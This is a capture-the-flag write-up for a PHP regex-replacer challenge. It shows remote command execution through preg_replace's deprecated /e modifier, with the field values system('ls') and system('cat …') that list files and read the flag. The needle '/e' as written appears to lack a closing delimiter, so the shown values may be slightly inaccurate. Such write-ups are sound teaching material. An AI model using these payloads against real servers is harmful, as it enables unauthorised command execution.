# Web Exotic Attacks Pro Replacer

The website provides a simple interface for text replacement using regular expressions:

- Needle – the regex pattern to find
- Replacement – the value to replace with
- Haystack – the input text where the search happens

The form submits a GET request like this:

```ruby
GET /?needle=...&replacement=...&haystack=...
```

The server uses the following dangerous PHP code behind the scenes:

```php
preg_replace($needle, $replacement, $haystack);
```

If the needle ends in the e modifier, like /pattern/e, it evaluates the replacement as PHP code. This major vulnerability was removed in PHP 7+.

Example: **preg_replace("/.*/e", "system('ls')", "test");**. Will run **system('ls')** on the server and replace the text with the output.

### Exploit

-> To List Files:
| **Field**     | **Value**                |
|---------------|--------------------------|
| **Needle**    | `/e`                     |
| **Replacement** | `system('ls')`         |
| **Haystack**  | *(leave empty or type anything)* |

This will run the ls command and print files in the current directory: 
```
index.php wRtu3ND38n8RNgez
```

-> To Read the Flag File:
| **Field**     | **Value**                                |
|---------------|-------------------------------------------|
| **Needle**    | `/e`                                      |
| **Replacement** | `system('cat wRtu3ND38n8RNgez')`       |
| **Haystack**  | *(anything to trigger match)*             |

This shows the flag: **SSS{st0p_3x3cut1ng_cmds_0n_my_s3rv3r}**
